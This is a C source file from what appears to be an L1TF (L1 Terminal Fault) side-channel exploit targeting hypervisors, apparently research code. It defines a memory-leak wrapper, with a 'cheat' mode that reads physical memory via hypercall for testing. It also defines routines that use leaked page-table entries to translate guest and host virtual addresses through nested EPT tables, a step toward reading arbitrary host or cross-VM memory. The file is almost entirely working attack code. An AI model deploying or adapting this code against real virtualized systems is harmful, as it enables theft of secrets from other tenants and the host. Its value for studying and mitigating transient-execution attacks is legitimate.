#include <stdlib.h>
#include <string.h>
#include "leak.h"
#include "l1tf.h"

u64 leak_attempts = 0; // in bytes

hpa_t gadget_base(void)
{
#if defined(BASE)
	dump(BASE);
        return BASE;
#endif
        return l1tf_find_base();
}

void leak(void *data, hpa_t base, hpa_t pa, int len)
{
	leak_attempts += len;
#if LEAK == CHEAT || LEAK == CHEAT_NOISY
        u64 *buf = malloc(len + 8);
        for (int off = 0; off < len; off += 8)
                buf[off/8] = hc_read_pa(pa+off);
        memcpy(data, buf, len);
#if LEAK == CHEAT_NOISY
	for (int i = 0; i < len; i++)
		if (rand() % 9 == 0)
			((char *)data)[i] = 0;
#endif
        return;
#endif
        l1tf_leak(data, base, pa, len);
}

u64 leak64(hpa_t base, hpa_t pa)
{
        u64 val;
        leak(&val, base, pa, sizeof(val));
        return val;
}

#define BITS_MASK(n, m) ( ((1ULL << n) - 1) & (~((1ULL << m) - 1)) )
#define PFN_MASK BITS_MASK(52, 12)
#define IS_HUGE(pte) (pte & (1ULL << 7))

pte_t leak_pte(hpa_t base, hpa_t pa)
{
	pte_t pte;
	int count = 0;
	do {
		for (int i = 0; i < 7; i++)
			pte = leak64(base, pa);
		if (++count % 1000 == 0) {
			printf("WARNING: leak_pte stuck for %d cycles; pte = %lx\n", count, pte);
			if (!(pte & 1)) {
				print_page_table(base, pa & ~0xfff);
			}
			exit(1);
		}
	} while (!(pte & 1));
	return pte;
}

hpa_t translate_va(hpa_t base, hva_t va, hpa_t cr3)
{
	const int verbose = 0;
	if (verbose >= 2) printf("\ttranslate_va(base=%lx, va=%lx, cr3=%lx)\n", base, va, cr3);
	hpa_t pgd_pa = cr3 + 8 * BITS(va, 48, 39);
	if (verbose >= 2) dumpp(pgd_pa);
	pte_t pgd = leak_pte(base, pgd_pa);
	if (verbose >= 1) dumpp(pgd);

	hpa_t l1 = pgd & PFN_MASK;
	if (verbose >= 2) dumpp(l1);
	hpa_t pud_pa = l1 + 8 * BITS(va, 39, 30);
	if (verbose >= 2) dumpp(pud_pa);
	pte_t pud = leak_pte(base, pud_pa);
	if (verbose >= 1) dumpp(pud);
	if (IS_HUGE(pud)) {
		hpa_t pa = (pud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
		if (verbose >= 2) dumpp(pa);
		return pa;
	}

	hpa_t l2 = pud & PFN_MASK;
	if (verbose >= 2) dumpp(l2);
	hpa_t pmd_pa = l2 + 8 * BITS(va, 30, 21);
	if (verbose >= 2) dumpp(pmd_pa);
	pte_t pmd = leak_pte(base, pmd_pa);
	if (verbose >= 1) dumpp(pmd);
	if (IS_HUGE(pmd)) {
		hpa_t pa = (pmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
		if (verbose >= 2) dumpp(pa);
		return pa;
	}

	hpa_t l3 = pmd & PFN_MASK;
	if (verbose >= 2) dumpp(l3);
	hpa_t pte_pa = l3 + 8 * BITS(va, 21, 12);
	if (verbose >= 2) dumpp(pte_pa);
	pte_t pte = leak_pte(base, pte_pa);
	if (verbose >= 1) dumpp(pte);
	hpa_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
	if (verbose >= 1) dumpp(pa);
	return pa;
}

hpa_t translate_nested(hpa_t base, gva_t va, hpa_t gcr3, hpa_t eptp)
{
	const int verbose = 0;
	if (verbose >= 2) printf("translate_nested(base=%lx, va=%lx, gcr3=%lx, eptp=%lx)\n", base, va, gcr3, eptp);
	hpa_t pgd_pa = gcr3 + 8 * BITS(va, 48, 39);
	if (verbose >= 2) dump(pgd_pa);
	pte_t gpgd = leak_pte(base, pgd_pa);
	if (verbose >= 2) dump(gpgd);
	pte_t pgd = translate_va(base, gpgd, eptp);
	pgd = (pgd & PFN_MASK) | (gpgd & ~PFN_MASK);
	if (verbose >= 1) dump(pgd);

	hpa_t l1 = pgd & PFN_MASK;
	if (verbose >= 2) dump(l1);
	hpa_t pud_pa = l1 + 8 * BITS(va, 39, 30);
	if (verbose >= 2) dump(pud_pa);
	pte_t gpud = leak_pte(base, pud_pa);
	if (verbose >= 2) dump(gpud);
	if (IS_HUGE(gpud)) {
		gpa_t gpa = (gpud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
		if (verbose >= 2) dump(gpa);
		hpa_t hpa = translate_va(base, gpa, eptp);
		if (verbose >= 1) dump(hpa);
		return hpa;
	}
	pte_t pud = translate_va(base, gpud, eptp);
	if (verbose >= 1) dump(pud);

	hpa_t l2 = pud & PFN_MASK;
	if (verbose >= 2) dump(l2);
	hpa_t pmd_pa = l2 + 8 * BITS(va, 30, 21);
	if (verbose >= 2) dump(pmd_pa);
	pte_t gpmd = leak_pte(base, pmd_pa);
	if (verbose >= 2) dump(gpmd);
	if (IS_HUGE(gpmd)) {
		gpa_t gpa = (gpmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
		if (verbose >= 2) dump(gpa);
		hpa_t hpa = translate_va(base, gpa, eptp);
		if (verbose >= 1) dump(hpa);
		return hpa;
	}
	pte_t pmd = translate_va(base, gpmd, eptp);
	if (verbose >= 1) dump(pmd);

	hpa_t l3 = pmd & PFN_MASK;
	if (verbose >= 2) dump(l3);
	hpa_t pte_pa = l3 + 8 * BITS(va, 21, 12);
	if (verbose >= 2) dump(pte_pa);
	pte_t gpte = leak_pte(base, pte_pa);
	if (verbose >= 2) dump(gpte);
	gpa_t gpa = (gpte & PFN_MASK) | BITS(va, 12, 0);
	if (verbose >= 1) dump(gpa);
	hpa_t hpa = translate_va(base, gpa, eptp);
	if (verbose >= 1) dump(hpa);
	return hpa;
}
